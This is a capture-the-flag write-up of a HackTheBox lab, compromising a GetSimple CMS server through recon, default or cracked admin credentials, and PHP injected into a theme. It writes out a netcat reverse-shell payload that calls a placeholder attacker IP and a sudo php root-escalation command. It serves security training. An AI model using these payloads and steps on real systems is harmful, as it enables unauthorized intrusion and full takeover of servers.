+++
title = "HTB-Init-test-skills"
date = "2025-02-16T09:12:30-06:00"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting
author = "corrupter"
authors = ["corrupter"]
authorTwitter = "" #do not include @
cover = ""
tags = ["Writeup", "Pentesting", "Revshells"]
keywords = ["", ""]
description = ""
showFullContent = false
hideComments = true 
+++

# Module Getting Started: Knowledge check

We get an IP adress target `$TARGET` which we have to pwn.

First, we make a simple nmap scan to get open services, versions and ports:

```sh
nmap -sV --open -oA start-skills-init-recon $TARGET
```

We get two services:

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The second seems to be a web server, running a page as the port is 80, for http. We run
a scan with `whatweb`:

```sh
$ whatweb $TARGET
http://$TARGET [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[$TARGET]
```

We get not many info, so heading to the page with a browser, we see the server
uses GetSimple CMS. `searchsploit` gives us some interesting information for vulnerabilities:

```sh
$ searchsploit GetSimple
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting                         | php/webapps/34789.html
Getsimple CMS 2.01 - 'components.php' Cross-Site Scripting                         | php/webapps/34041.txt
Getsimple CMS 2.01 - Local File Inclusion                                          | php/webapps/12517.txt
Getsimple CMS 2.01 - Multiple Vulnerabilities                                      | php/webapps/14338.html
Getsimple CMS 2.01 < 2.02 - Administrative Credentials Disclosure                  | php/webapps/15605.txt
Getsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload                       | php/webapps/35353.txt
Getsimple CMS 3.0 - 'set' Local File Inclusion                                     | php/webapps/35726.py
Getsimple CMS 3.1.2 - 'path' Local File Inclusion                                  | php/webapps/37587.txt
Getsimple CMS 3.2.1 - Arbitrary File Upload                                        | php/webapps/25405.txt
GetSimple CMS 3.3.1 - Cross-Site Scripting                                         | php/webapps/43888.txt
Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting                              | php/webapps/32502.txt
Getsimple CMS 3.3.10 - Arbitrary File Upload                                       | php/webapps/40008.txt
GetSimple CMS 3.3.13 - Cross-Site Scripting                                        | php/webapps/44408.txt
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting                             | php/webapps/49726.py
GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated)             | php/webapps/48850.txt
GetSimple CMS 3.3.4 - Information Disclosure                                       | php/webapps/49928.py
GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery                           | php/webapps/49816.py
Getsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary File Upload               | php/webapps/37472.php
GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery            | php/webapps/49774.py
GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting       | php/webapps/49798.py
GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery (Add Admin)     | php/webapps/48745.txt
GetSimple CMS v3.3.16 - Remote Code Execution (RCE)                                | php/webapps/51475.py
GetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit)                  | php/remote/46880.rb
----------------------------------------------------------------------------------- ---------------------------------
```

Seems like we can upload or run arbitrary code. Meanwhile, `gobuster` gives us useful paths to
explore:

```sh
$ gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://$TARGET
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://$TARGET/admin/]
/backups              (Status: 301) [Size: 316] [--> http://$TARGET/backups/]
/data                 (Status: 301) [Size: 313] [--> http://$TARGET/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 316] [--> http://$TARGET/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 278]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 314] [--> http://$TARGET/theme/]
Progress: 4734 / 4735 (99.98%)
===============================================================
Finished
===============================================================
```

The paths `/admin` and `/data` seem promising, so we explore them. The former gives us a
login page. Trying default passwords like `admin:admin` actually works, but alternatively
we could have searched the later directory and see that in the `/users` subdirectory resides
an `admin.xml` file with the following content:

```xml
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>
```

We see a hash, which `john` can easily crack and thus, obtaining the same credentials

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt admin-xml-hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)
1g 0:00:00:00 DONE (2024-12-25 13:26) 50.00g/s 991200p/s 991200c/s 991200C/s alcala..LOVE1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

When logging, we see many components in the admin pannel. Our interest is,
initially, the `upload.php` as `searchsploit` indicated a file upload
vulnerability, but the upload button seemed to be disabled. Searching around we
see that we can edit the theme code in the `themes.php` component. Using a
simple script like `<?php system('id'); ?>` works when reloading the page (note
that the edited theme must be enabled). We can then use a revshell like:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTCK_MACHINE_IP] [PORT] >/tmp/f") ?>
```

> [!IMPORTANT]
> You might save a copy of the original php template as this might disrupt the server.

Make sure to substitute `ATTCK_MACHINE_IP` by your machine IP through a VPN and
`PORT` by a choice port.

We listen with netcat at the port specified in the payload with `nc -lvnp PORT`
and see that, on page reload, the connection is stabilshed. There we can go to
the directory `/home/mrb3n` to get the `user.txt` flag.

To escalate privileges we explore binaries. Running `sudo -l` we see that a php
binary can be used with root privileges without password by all users:

```sh
$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

$ ls -l /usr/bin/php
lrwxrwxrwx 1 root root 21 Feb  9  2021 /usr/bin/php -> /etc/alternatives/php
```

A quick search in GTFObins tells us we can escalate to root as follows:

```sh
$ CMD="/bin/sh"
$ sudo php -r "system('$CMD');"
```

With this, we can get the last flag `root.txt` at the `/root/` directory.

We then successfully pwned the box.
